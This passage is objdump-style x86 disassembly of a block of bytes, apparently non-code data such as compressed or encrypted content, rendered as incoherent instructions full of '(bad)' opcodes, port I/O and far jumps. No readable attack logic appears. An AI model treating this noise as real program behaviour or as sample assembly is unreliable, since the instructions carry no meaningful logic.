  41cb80:	jo     0x41cbca
  41cb82:	stos   DWORD PTR es:[edi],eax
  41cb83:	not    DWORD PTR [ecx+0x10f0e4f4]
  41cb89:	add    BYTE PTR [ebp+0x5ca393d5],ch
  41cb8f:	jne    0x41cb68
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x80310d22
  41cc03:	push   eax
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0x9b000001
  41cc0d:	punpckhbw mm4,mm2
  41cc10:	out    0x7b,eax
  41cc12:	fldenv [eax-0x101e3cd]
  41cc18:	js     0x41cc89
  41cc1a:	rol    BYTE PTR [edx+0x568dab6b],cl
  41cc20:	push   0x2b
  41cc22:	dec    DWORD PTR [esi+0x3680454d]
  41cc28:	mov    ecx,gs
  41cc2a:	push   edx
  41cc2b:	stos   DWORD PTR es:[edi],eax
  41cc2c:	xor    eax,DWORD PTR [edx]
  41cc2e:	int3   
  41cc2f:	xor    bh,cl
  41cc31:	fdivr  st(6),st
  41cc33:	fwait
  41cc34:	push   ds
  41cc35:	jb     0x41cc19
  41cc37:	xor    ah,BYTE PTR [esi]
  41cc39:	pop    ds
  41cc3a:	(bad)  
  41cc3b:	sbb    DWORD PTR [edx-0x4eb675e],esi
  41cc41:	fisttp WORD PTR [edi+esi*1+0x10]
  41cc45:	adc    cl,BYTE PTR ds:0x93e98166
  41cc4b:	int    0xc7
  41cc4d:	mov    cl,0xe
  41cc4f:	ror    BYTE PTR [eax],cl
  41cc51:	pop    esp
  41cc52:	ja     0x41ccb0
  41cc54:	std    
  41cc55:	pop    es
  41cc56:	pop    edi
  41cc57:	jmp    0x41cc91
  41cc59:	add    ebp,esp
  41cc5b:	clc    
  41cc5c:	xchg   esp,eax
  41cc5d:	dec    esp
  41cc5e:	cs jb  0x41cc1d
  41cc61:	int    0xae
  41cc63:	add    ecx,DWORD PTR [ebx+0x54]
  41cc66:	inc    esp
  41cc67:	xchg   ebp,eax
  41cc68:	pop    ecx
  41cc69:	add    DWORD PTR [ebx],esi
  41cc6b:	mov    al,0x4a
  41cc6d:	out    dx,eax
  41cc6e:	test   edi,ebp
  41cc70:	arpl   WORD PTR [ecx-0x2bbf5ae5],si
  41cc76:	int3   
  41cc77:	fisub  WORD PTR [ebx+0x763174cf]
  41cc7d:	jecxz  0x41cbff
  41cc7f:	sti    
  41cc80:	jns    0x41ccde
  41cc82:	aas    
  41cc83:	outs   dx,BYTE PTR ds:[esi]
  41cc84:	fs cwde 
  41cc86:	xlat   BYTE PTR ds:[ebx]
  41cc87:	lods   eax,DWORD PTR ds:[esi]
  41cc88:	xchg   DWORD PTR ds:0xa03504d5,ebx
  41cc8e:	adc    BYTE PTR [edx-0xe],bh
  41cc91:	retf   0x2aab
  41cc94:	mov    ebx,DWORD PTR [ecx-0x1b]
  41cc97:	iret   
  41cc98:	arpl   ax,bp
  41cc9a:	aam    0xf7
  41cc9c:	sbb    bl,dl
  41cc9e:	ret    
  41cc9f:	sbb    esp,DWORD PTR [eax*1+0x2996ba4e]
  41cca6:	dec    edi
  41cca7:	pusha  
  41cca8:	mov    edi,0x62dc80c3
  41ccad:	fistp  DWORD PTR [eax-0x4ca05f1f]
  41ccb3:	cmp    DWORD PTR [edi+0x73],edi
  41ccb6:	fstp   QWORD PTR [edx-0x46]
  41ccb9:	(bad)  
  41ccba:	xchg   edi,eax
  41ccbb:	call   0xe27f8b3f
  41ccc0:	and    dl,ah
  41ccc2:	mov    ebx,DWORD PTR [edx-0x54]
  41ccc5:	lock push edx
  41ccc7:	pop    es
  41ccc8:	ins    BYTE PTR es:[edi],dx
  41ccc9:	hlt    
  41ccca:	pop    eax
  41cccb:	mov    al,0x1e
  41cccd:	dec    ebp
  41ccce:	adc    ah,BYTE PTR [ebp+0x380e8c55]
  41ccd4:	pop    es
  41ccd5:	leave  
  41ccd6:	hlt    
  41ccd7:	retf   0xb121
  41ccda:	inc    edx
  41ccdb:	lds    edx,FWORD PTR [edi-0x59e87021]
  41cce1:	mov    edx,0x6a248eaa
  41cce6:	mov    ds:0x505b54fe,eax
  41cceb:	jmp    0xde920d7b
  41ccf0:	out    dx,al
  41ccf1:	jl     0x41cd5d
  41ccf3:	jb     0x41cce7
  41ccf5:	arpl   WORD PTR [ecx],bx
  41ccf7:	inc    edx
  41ccf8:	inc    edi
  41ccf9:	mov    cl,0x82
  41ccfb:	jmp    0x41cca5
  41ccfd:	pop    edi
  41ccfe:	sahf   
  41ccff:	push   edi
  41cd00:	push   eax
  41cd01:	outs   dx,DWORD PTR ds:[esi]
  41cd02:	dec    edx
  41cd03:	jmp    0x41cd1d
  41cd05:	cwde   
  41cd06:	jp     0x41ccfb
  41cd08:	ret    0x3411
  41cd0b:	add    cl,BYTE PTR [edi+0x13b79ea3]
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    al,BYTE PTR ds:0x32b796b0
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x9c000001
  41cd8d:	dec    ebp
  41cd8e:	cmp    eax,0x713219ce
  41cd93:	stos   DWORD PTR es:[edi],eax
  41cd94:	lahf   
  41cd95:	cmp    al,0x34
  41cd97:	int    0xbd
  41cd99:	(bad)
  41cd9d:	rol    DWORD PTR [ecx],cl
  41cd9f:	mov    ds:0xd63793cc,eax
  41cda4:	(bad)  
  41cda5:	mov    esp,0xbae8a71f
  41cdaa:	loop   0x41cd52
  41cdac:	sub    ebx,eax
  41cdae:	data16 fistp WORD PTR [edi+0x28]
  41cdb2:	mov    bl,0x5e
  41cdb4:	inc    ebp
  41cdb5:	aam    0x72
  41cdb7:	cmp    eax,0xe1000321
  41cdbc:	sub    eax,0x2af904d9
  41cdc1:	call   0xd42d:0x297fed13
  41cdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc9:	jb     0x41cd71
  41cdcb:	xor    BYTE PTR [eax-0x1ab95d8],dl
  41cdd1:	leave  
  41cdd2:	and    eax,0xdbdec494
  41cdd7:	fdivr  QWORD PTR [edx+0x36dc3d52]
  41cddd:	lock imul edi,esi,0xe414966a
  41cde4:	adc    BYTE PTR [edi-0x54],bl
  41cde7:	les    ecx,FWORD PTR [eax*4+0xf1ba198]
  41cdee:	pop    edi
  41cdef:	(bad)  
  41cdf0:	popa   
  41cdf1:	outs   dx,DWORD PTR ds:[esi]
  41cdf2:	jne    0x41cd78
  41cdf4:	div    DWORD PTR [esp+eax*4]
  41cdf7:	adc    edi,DWORD PTR [eax-0x59]
  41cdfa:	xor    bh,dh
  41cdfc:	sbb    esi,ecx
  41cdfe:	add    dl,bh
  41ce00:	nop
  41ce01:	mov    ds:0x9488874a,al
  41ce06:	loopne 0x41ce75
  41ce08:	mov    esp,0xc00ac94e
  41ce0d:	cld    
  41ce0e:	xchg   ebp,eax
  41ce0f:	and    ecx,0xf46bef1a
  41ce15:	add    BYTE PTR [edx+0x69],cl
  41ce18:	push   edi
  41ce19:	(bad)  
  41ce1a:	lods   al,BYTE PTR ds:[esi]
  41ce1b:	mov    fs,WORD PTR [edi-0x5aa27723]
  41ce21:	std    
  41ce22:	and    BYTE PTR [edi+ebx*1+0x23],al
  41ce26:	fdivr  QWORD PTR [ebx]
  41ce28:	stc    
  41ce29:	xor    DWORD PTR [ebp+0x3f],edi
  41ce2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce2d:	pop    ebp
  41ce2e:	and    eax,0xebe3cb23
  41ce33:	xchg   edx,eax
  41ce34:	ret    0x2b16
  41ce37:	(bad)  
  41ce38:	pushf  
  41ce39:	dec    ebx
  41ce3a:	test   eax,0x21502e97
  41ce40:	cld    
  41ce41:	inc    esp
  41ce42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce43:	in     al,dx
  41ce44:	ins    DWORD PTR es:[edi],dx
  41ce45:	es pop ebp
  41ce47:	inc    esp
  41ce48:	int3   
  41ce49:	mov    ecx,0x3f2e6f56
  41ce4e:	ret    
  41ce4f:	dec    eax
  41ce50:	mov    edi,0xcf06a527
  41ce55:	push   ebp
  41ce56:	xor    ebx,DWORD PTR [edi]
  41ce58:	popa   
  41ce59:	or     BYTE PTR [esp+ecx*4+0x71e715fc],0xfe
  41ce61:	sub    esp,DWORD PTR [ebp+0x49]
  41ce64:	daa    
  41ce65:	stos   BYTE PTR es:[edi],al
  41ce66:	dec    ebx
  41ce67:	ficom  DWORD PTR [ecx]
  41ce69:	test   BYTE PTR [edx],ch
  41ce6b:	js     0x41cee2
  41ce6d:	bound  eax,QWORD PTR [esp+esi*4+0x8cb895e]
  41ce74:	iret   
  41ce75:	js     0x41ce67
  41ce77:	fist   DWORD PTR [esi+0x3f]
  41ce7a:	mov    ebp,0xd171b74b
  41ce7f:	sahf   
  41ce80:	xlat   BYTE PTR ds:[ebx]
  41ce81:	ret    
  41ce82:	ret    
  41ce83:	int3   
  41ce84:	hlt    
  41ce85:	cmc    
  41ce86:	call   0xe8fc:0xbddf4a3d
  41ce8d:	je     0x41ced0
  41ce8f:	imul   esi,DWORD PTR [eax],0x0
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	ins    BYTE PTR es:[edi],dx
  41cf01:	sti    
  41cf02:	int    0xa2
  41cf04:	mov    esp,0x5000133
  41cf09:	add    DWORD PTR [eax],eax
  41cf0b:	add    BYTE PTR [eax],ch
  41cf0d:	(bad)  
  41cf0f:	shl    DWORD PTR [ebx+0x5a],cl
  41cf12:	nop
  41cf13:	pop    eax
  41cf14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf15:	push   ebp
  41cf16:	add    ebp,DWORD PTR [eax+edi*1-0x3b399c7c]
  41cf1d:	enter  0x23f7,0x72
  41cf21:	add    DWORD PTR [ebx-0x12],eax
  41cf24:	test   eax,0x5ceec3b1
  41cf29:	mov    bh,BYTE PTR [ecx+0x5b6eced]
  41cf2f:	adc    al,0x72
  41cf31:	mov    ds:0xdcca412b,eax
  41cf36:	xchg   ebp,eax
  41cf37:	push   0x38f329c3
  41cf3c:	retw   
  41cf3e:	fld    QWORD PTR [esi+eiz*8+0x58ed6ea2]
  41cf45:	mov    esi,ecx
  41cf47:	mov    ds:0x4f1261a9,al
  41cf4c:	gs or  ebx,ebx
  41cf4f:	push   ecx
  41cf50:	push   edi
  41cf51:	pop    ebx
  41cf52:	xchg   ebp,eax
  41cf53:	dec    esi
  41cf54:	jmp    DWORD PTR [ecx-0x4]
  41cf57:	iret   
  41cf58:	in     al,0x28
  41cf5a:	sar    BYTE PTR [esi+0x58ab53b4],0x11
  41cf61:	mov    dh,0x33
  41cf63:	mov    dl,0x92
  41cf65:	mov    al,0xc1
  41cf67:	xchg   edi,eax
  41cf68:	xor    DWORD PTR [ecx+0x6e],esp
  41cf6b:	xchg   esp,eax
  41cf6c:	std    
  41cf6d:	sub    eax,0x109b9f7d
  41cf72:	xchg   ecx,eax
  41cf73:	push   es
  41cf74:	dec    ebx
  41cf75:	mov    eax,0xded2bb98
  41cf7a:	loope  0x41cf93
  41cf7c:	pop    ecx
  41cf7d:	and    al,0xd5
  41cf7f:	daa    
  41cf80:	jle    0x41cf55
  41cf82:	dec    ecx
  41cf83:	imul   edi,DWORD PTR [esi-0x5e8ed45b],0x883d2313
  41cf8d:	jne    0x41cf27
  41cf8f:	xchg   esp,eax
  41cf90:	add    BYTE PTR [ebx],bh
  41cf92:	mov    edi,0x2850fcf9
  41cf97:	xor    al,0xba
  41cf99:	cld    
  41cf9a:	xlat   BYTE PTR ds:[ebx]
  41cf9b:	int3   
  41cf9c:	jb     0x41cfbe
  41cf9e:	retf   0x692c
  41cfa1:	jle    0x41cf48
  41cfa3:	inc    ecx
  41cfa4:	je     0x41cff7
  41cfa6:	jnp    0x41cfbb
  41cfa8:	mov    edi,DWORD PTR [eax-0x25]
  41cfab:	addr16 ss gs cdq 
  41cfaf:	shl    DWORD PTR [ecx+edi*8],0xf6
  41cfb3:	xor    dl,BYTE PTR [eax]
  41cfb5:	inc    ebx
  41cfb6:	ss aas 
  41cfb8:	cdq    
  41cfb9:	jg     0x41cfb2
  41cfbb:	jne    0x41cfd1
  41cfbd:	fwait
  41cfbe:	cmp    ebx,DWORD PTR [edx]
  41cfc0:	add    eax,0xdefb8417
  41cfc5:	out    0x63,al
  41cfc7:	adc    BYTE PTR [edi-0x46ff68d4],dl
  41cfcd:	mul    BYTE PTR [esi-0x4a]
  41cfd0:	jae    0x41cf6f
  41cfd2:	add    eax,0xc25efe0
  41cfd7:	lock inc ebp
  41cfd9:	dec    ecx
  41cfda:	jmp    0x406c:0xf60b4fdb
  41cfe1:	shl    bl,0x43
  41cfe4:	push   cs
  41cfe5:	push   es
  41cfe6:	add    eax,DWORD PTR [edx+edx*8]
  41cfe9:	int    0xa9
  41cfeb:	and    ebp,esp
  41cfed:	mov    esp,0x767bf304
  41cff2:	push   esi
  41cff3:	sub    al,0xd6
  41cff5:	mov    ch,0xd
  41cff7:	iret   
  41cff8:	jbe    0x41cf91
  41cffa:	int    0xa5
  41cffc:	retf   0x760f
  41cfff:	sub    eax,0xe0813b38
  41d004:	mov    BYTE PTR [esi],al
  41d006:	sbb    esi,DWORD PTR [edi+0x4ac0f0ef]
  41d00c:	repz stc 
  41d00e:	(bad)  
  41d010:	or     eax,DWORD PTR [eax]
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x8ee253bd
  41d083:	rol    cl,cl
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0xd000001,al
  41d08d:	add    eax,0x7c98381c
  41d092:	sar    DWORD PTR [esi+0x625c23e6],1
  41d098:	sub    bl,ah
  41d09a:	mov    WORD PTR [eax-0x22],es
  41d09d:	lea    edx,[ecx-0x2f]
  41d0a0:	mov    ds,WORD PTR [edi+edi*4+0x42c89ef6]
  41d0a7:	sub    esp,esi
  41d0a9:	cmp    ch,BYTE PTR [eax+edi*4+0x58e662ee]
  41d0b0:	loope  0x41d0a2
  41d0b2:	js     0x41d114
  41d0b4:	mov    bh,0x8
  41d0b6:	scas   al,BYTE PTR es:[edi]
  41d0b7:	dec    ebp
  41d0b8:	retf   0x7d0f
  41d0bb:	sub    edx,DWORD PTR [eax]
  41d0bd:	inc    edi
  41d0be:	femms  
  41d0c0:	pop    eax
  41d0c1:	or     eax,DWORD PTR [edx]
  41d0c3:	push   ss
  41d0c4:	fiadd  DWORD PTR [edi+eiz*2+0x581487d6]
  41d0cb:	not    BYTE PTR [ebx]
  41d0cd:	lods   al,BYTE PTR ds:[esi]
  41d0ce:	xor    ebp,DWORD PTR [edx-0x44]
  41d0d1:	xor    ecx,DWORD PTR gs:[eiz*2+0x37ab5508]
  41d0d9:	popa   
  41d0da:	mov    ds:0x724ac61a,al
  41d0df:	fisttp WORD PTR ds:0x481b5224
  41d0e5:	jbe    0x41d111
  41d0e7:	xlat   BYTE PTR ds:[ebx]
  41d0e8:	xchg   bx,ax
  41d0ea:	mov    edi,0x85382fd5
  41d0ef:	adc    DWORD PTR [esp+edi*4],ebx
  41d0f2:	mov    bp,0x33cd
  41d0f6:	cs cld 
  41d0f8:	cmp    esi,DWORD PTR [esp+eax*1-0x17e83980]
  41d0ff:	fisub  WORD PTR [ecx]
  41d101:	or     eax,0xcc5e24df
  41d106:	sub    al,BYTE PTR [esi+0x18a2d4c2]
  41d10c:	clc    
  41d10d:	sub    al,0x18
  41d10f:	or     eax,0xe2a50e21
  41d114:	sbb    BYTE PTR [esp+eiz*8],bh
  41d117:	not    DWORD PTR [esi+0x7d]
  41d11a:	sbb    BYTE PTR ds:0x3477ab5c,bh
  41d120:	addr16 test dl,ch
  41d123:	push   esi
  41d124:	je     0x41d114
  41d126:	stc    
  41d127:	or     esp,DWORD PTR [ecx-0x7156de32]
  41d12d:	sub    eax,0x8f5478fb
  41d132:	mov    al,0xcd
  41d134:	bswap  esi
  41d136:	out    0x80,eax
  41d138:	je     0x41d1a3
  41d13a:	push   esp
  41d13b:	mov    bl,0x3d
  41d13d:	cs push ecx
  41d13f:	jns    0x41d11c
  41d141:	cli    
  41d142:	xchg   ebp,eax
  41d143:	push   ebp
  41d144:	rcr    BYTE PTR [eax-0xd6f2456],1
  41d14a:	loope  0x41d1c6
  41d14c:	mov    ebp,0xa9769e14
  41d151:	cmp    eax,0x2c982824
  41d156:	dec    ecx
  41d157:	nop
  41d158:	rcl    BYTE PTR [ecx+0x22],1
  41d15b:	sbb    edx,DWORD PTR [eax]
  41d15d:	and    BYTE PTR [eax+0x47167831],dh
  41d163:	mov    al,0x5a
  41d165:	jle    0x41d103
  41d167:	push   ds
  41d168:	fcmovbe st,st(0)
  41d16a:	pushf  
  41d16b:	mov    ebx,0x8c6a95ae
  41d170:	imul   ebp,DWORD PTR [edi],0x2696bfba
  41d176:	add    eax,0xe17af950
  41d17b:	cwde   
  41d17c:	jb     0x41d1c9
  41d17e:	push   ebx
  41d17f:	and    DWORD PTR [edi],ecx
  41d181:	dec    ebp
  41d182:	push   ds
  41d183:	ss push cs
  41d185:	aam    0x91
  41d187:	cs jo  0x41d18e
  41d18a:	mov    al,0x88
  41d18c:	in     eax,0x8c
  41d18e:	dec    ecx
  41d18f:	leave  
  41d190:	dec    ecx
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	mov    ah,0xaa
  41d202:	loope  0x41d1e1
  41d204:	(bad)  
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	ret    
  41d20d:	mov    WORD PTR [esi+0x73c21eba],fs
  41d213:	test   DWORD PTR [ecx+0x7d4ccdb9],0x90216bb8
  41d21d:	shl    edi,cl
  41d21f:	in     eax,dx
  41d220:	add    al,0x93
  41d222:	push   esp
  41d223:	jp     0x41d212
  41d225:	mov    dh,0xa5
  41d227:	add    BYTE PTR [ebx-0x7c],al
  41d22a:	ja     0x41d265
  41d22c:	xor    al,BYTE PTR [edx+0x244c38f0]
  41d232:	hlt    
  41d233:	cmp    BYTE PTR [ecx],cl
  41d235:	add    ebx,0xffffffc7
  41d238:	cmp    ah,dl
  41d23a:	repnz lds esp,FWORD PTR [ebx]
  41d23d:	mov    ds:0x8a5d09b5,eax
  41d242:	mov    ss,WORD PTR [ecx-0xb29b9b1]
  41d248:	test   BYTE PTR [eax+0x48],bl
  41d24b:	lahf   
  41d24c:	leave  
  41d24d:	call   0xd81e56f1
  41d252:	xor    ch,BYTE PTR [edx-0x6d]
  41d255:	ins    DWORD PTR es:[edi],dx
  41d256:	push   0x17
  41d258:	into   
  41d259:	lahf   
  41d25a:	int3   
  41d25b:	outs   dx,DWORD PTR ds:[esi]
  41d25c:	push   cs
  41d25d:	idiv   BYTE PTR [edx-0x14]
  41d260:	cmp    ebx,ebp
  41d262:	hlt    
  41d263:	push   0xffffffab
  41d265:	psadbw mm7,QWORD PTR [ebp-0x4946e11c]
  41d26c:	aad    0x9f
  41d26e:	ror    esi,1
  41d270:	retf   0xcf68
  41d273:	inc    BYTE PTR [edx]
  41d275:	sub    al,al
  41d277:	mov    al,0xf9
  41d279:	(bad)  
  41d27a:	mov    ch,0xdd
  41d27c:	xor    ebx,esp
  41d27e:	inc    ecx
  41d27f:	cs and eax,0x818ad002
  41d285:	inc    esp
  41d286:	out    dx,al
  41d287:	jg     0x41d28a
  41d289:	adc    eax,DWORD PTR [ebx+0x3d]
  41d28c:	fst    DWORD PTR [eax-0x728b5b71]
  41d292:	xlat   BYTE PTR ds:[ebx]
  41d293:	xrelease mov DWORD PTR ds:0xa37c60cd,0x4c4f1988
  41d29e:	lea    esi,[edi-0x21f597d5]
  41d2a4:	jbe    0x41d2f1
  41d2a6:	or     al,0xeb
  41d2a8:	bound  esi,QWORD PTR [esi-0x43bd0e6a]
  41d2ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2af:	hlt    
  41d2b0:	cmp    dl,ah
  41d2b2:	cmp    eax,0x3d8be113
  41d2b7:	pop    ebp
  41d2b8:	cmc    
  41d2b9:	(bad)  
  41d2bb:	sub    edi,ebx
  41d2bd:	adc    BYTE PTR [edx+0x6b],bh
  41d2c0:	(bad)  
  41d2c1:	fld    QWORD PTR [ebp-0x535ca8e8]
  41d2c7:	xchg   DWORD PTR [ebx],edi
  41d2c9:	mov    eax,0x69e18823
  41d2ce:	mov    cl,0x45
  41d2d0:	rcl    BYTE PTR [edi],cl
  41d2d2:	xchg   BYTE PTR [ebx],ah
  41d2d4:	in     eax,dx
  41d2d5:	pop    edi
  41d2d6:	add    al,0x29
  41d2d8:	or     BYTE PTR [ecx+0x42339eeb],ah
  41d2de:	and    ecx,DWORD PTR [eax-0x46]
  41d2e1:	jle    0x41d336
  41d2e3:	ror    DWORD PTR [edx-0xec7835f],0x7e
  41d2ea:	adc    DWORD PTR [eax-0x1a4a81ea],ecx
  41d2f0:	ins    DWORD PTR es:[edi],dx
  41d2f1:	mov    ah,0xe3
  41d2f3:	test   al,0x7f
  41d2f5:	sub    ch,BYTE PTR [esi-0x589d7410]
  41d2fb:	dec    esp
  41d2fc:	dec    ebp
  41d2fd:	lods   al,BYTE PTR ds:[esi]
  41d2fe:	mov    esp,0x850c105
  41d303:	push   0x3c6670c
  41d308:	dec    ebx
  41d309:	jmp    0x1c29250
  41d30e:	pop    edx
  41d30f:	jle    0x41d2ee
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx+0x4c],0xc2
  41d382:	std    
  41d383:	loop   0x41d350
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x32000001
  41d38d:	pusha  
  41d38e:	inc    edx
  41d38f:	sbb    edx,eax
  41d391:	inc    ecx
  41d392:	ja     0x41d356
  41d394:	div    DWORD PTR [esi]
  41d396:	iret   
  41d397:	and    al,0x71
  41d399:	xchg   ecx,eax
  41d39a:	out    0x40,al
  41d39c:	push   esp
  41d39d:	sti    
  41d39e:	leave  
  41d39f:	cmc    
  41d3a0:	xchg   ecx,eax
  41d3a1:	add    bl,dh
  41d3a3:	cmp    BYTE PTR [ebx],bh
  41d3a5:	adc    ebx,DWORD PTR ds:0x1902fd6c
  41d3ab:	(bad)  
  41d3ac:	jge    0x41d335
  41d3ae:	sub    cl,dl
  41d3b0:	into   
  41d3b1:	retf   0x2133
  41d3b4:	mov    ds:0x444d7fc2,eax
  41d3b9:	dec    edx
  41d3ba:	adc    dh,dl
  41d3bc:	in     al,dx
  41d3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3be:	cs (bad) 
  41d3c0:	div    cl
  41d3c2:	add    eax,0xebc4a811
  41d3c7:	and    BYTE PTR [ecx-0x42ce16e],0x65
  41d3ce:	push   edi
  41d3cf:	out    dx,eax
  41d3d0:	mov    ah,0xdf
  41d3d2:	lock sub DWORD PTR [edx+0x475d3c37],esp
  41d3d9:	dec    edx
  41d3da:	xchg   ebp,eax
  41d3db:	js     0x41d3d4
  41d3dd:	push   esp
  41d3de:	xchg   esp,eax
  41d3df:	out    dx,al
  41d3e0:	dec    ecx
  41d3e1:	rcl    BYTE PTR [edx+0x14f18eae],cl
  41d3e7:	inc    esp
  41d3e8:	ins    BYTE PTR es:[edi],dx
  41d3e9:	push   ecx
  41d3ea:	or     DWORD PTR [ebx-0x39429df2],esi
  41d3f0:	out    0x4d,eax
  41d3f2:	nop
  41d3f3:	pop    ds
  41d3f4:	dec    esp
  41d3f5:	push   es
  41d3f6:	rcl    DWORD PTR [ebx],cl
  41d3f8:	cwde   
  41d3f9:	and    ebp,DWORD PTR [edx+ebp*4-0x788a673a]
  41d400:	out    0x94,al
  41d402:	mov    ecx,0xcc5c0c6f
  41d407:	in     al,dx
  41d408:	adc    eax,0x22f2447b
  41d40d:	cwde   
  41d40e:	sbb    ecx,edx
  41d410:	mov    ds:0x99c32a7c,eax
  41d415:	pop    esp
  41d416:	mov    edx,DWORD PTR [edi]
  41d418:	jbe    0x41d39d
  41d41a:	(bad)  
  41d41b:	int3   
  41d41c:	mov    ch,0xce
  41d41e:	ins    BYTE PTR es:[edi],dx
  41d41f:	dec    edx
  41d420:	dec    edi
  41d421:	sub    eax,0x3e1850a
  41d426:	sub    BYTE PTR [esi+0x57],bh
  41d429:	sub    BYTE PTR [edx],bh
  41d42b:	sub    esp,DWORD PTR [ebx+0x2cfec9fa]
  41d431:	cdq    
  41d432:	out    dx,eax
  41d433:	jge    0x41d40f
  41d435:	dec    ecx
  41d436:	sbb    eax,0x1070797e
  41d43b:	dec    edi
  41d43c:	mov    ds:0xfbd93457,al
  41d441:	pop    ss
  41d442:	sub    al,bl
  41d444:	retf   
  41d445:	popa   
  41d446:	push   edi
  41d447:	push   ecx
  41d448:	lods   eax,DWORD PTR ds:[esi]
  41d449:	(bad)  
  41d44a:	aad    0xc
  41d44c:	adc    bl,0x9a
  41d44f:	and    DWORD PTR [ebx],edi
  41d451:	psllw  mm0,QWORD PTR [esi]
  41d454:	jmp    0x41d458
  41d456:	mov    esp,0x60fe0102
  41d45b:	and    al,0x7c
  41d45d:	xchg   edi,eax
  41d45e:	ret    
  41d45f:	rcr    DWORD PTR [ecx],0x79
  41d462:	xor    edi,DWORD PTR [edx-0x493c86e1]
  41d468:	loopne 0x41d4d4
  41d46a:	xchg   esp,eax
  41d46b:	cmp    BYTE PTR [ebx+0x2b],bl
  41d46e:	daa    
  41d46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d470:	popf   
  41d471:	jo     0x41d4c5
  41d473:	lea    esp,[ecx-0x11f40425]
  41d479:	pop    eax
  41d47a:	ret    
  41d47b:	push   cs
  41d47c:	fld    QWORD PTR [eax+0x15]
  41d47f:	test   DWORD PTR [esi+0x36bbdd6c],ebx
  41d485:	push   ecx
  41d486:	dec    edi
  41d487:	scas   ax,WORD PTR es:[edi]
  41d489:	xor    dl,BYTE PTR [esi-0xd16e52c]
  41d48f:	jb     0x41d466
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd0c6:0xb6cdc789
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xf1000001
  41d50d:	nop
  41d50e:	xchg   DWORD PTR [ecx-0x1844c215],ebp
  41d514:	cmp    DWORD PTR [edx+edi*2],esp
  41d517:	jecxz  0x41d551
  41d519:	repnz sub eax,0x8ad1c66b
  41d51f:	nop
  41d520:	jmp    eax
  41d522:	or     dl,al
  41d524:	xchg   edi,eax
  41d525:	mov    dh,0xdf
  41d527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d528:	xor    eax,0x41abe561
  41d52d:	ins    DWORD PTR es:[edi],dx
  41d52e:	push   es
  41d52f:	jg     0x41d4b6
  41d531:	xor    cl,dl
  41d533:	push   ds
  41d534:	push   0x30ae95f7
  41d539:	dec    edi
  41d53a:	push   eax
  41d53b:	xor    DWORD PTR [esi+eax*4],esp
  41d53e:	jnp    0x41d560
  41d540:	mov    ebp,DWORD PTR [ebx]
  41d542:	sahf   
  41d543:	cmp    al,0xfd
  41d545:	jge    0x41d4ef
  41d547:	jg     0x41d57b
  41d549:	(bad)  
  41d54a:	xchg   edx,eax
  41d54b:	jbe    0x41d5b5
  41d54d:	push   ebp
  41d54e:	(bad)  
  41d550:	pop    eax
  41d551:	adc    edx,DWORD PTR [esi+0x5f3a20d2]
  41d557:	xchg   esp,eax
  41d558:	repz xchg ebp,eax
  41d55a:	xor    al,0x31
  41d55c:	(bad)  
  41d55d:	neg    DWORD PTR [ecx-0x1fcb4158]
  41d563:	arpl   WORD PTR [esi+eiz*8+0x78],ax
  41d567:	jecxz  0x41d50c
  41d569:	retf   0xc3f5
  41d56c:	out    0xdd,eax
  41d56e:	addr16 call 0xbbdb:0x936840c2
  41d576:	loopne 0x41d544
  41d578:	mov    dl,0x2
  41d57a:	adc    DWORD PTR [ebp-0x1d],edi
  41d57d:	push   0xc7ecc708
  41d582:	inc    edx
  41d583:	mov    ecx,0xda8f6938
  41d588:	inc    edx
  41d589:	cmp    BYTE PTR [ebx+0x539289a8],0x3c
  41d590:	mov    dl,0x5a
  41d592:	sbb    al,0x6f
  41d594:	shl    DWORD PTR [ebp+0x70d3763d],0xed
  41d59b:	retf   
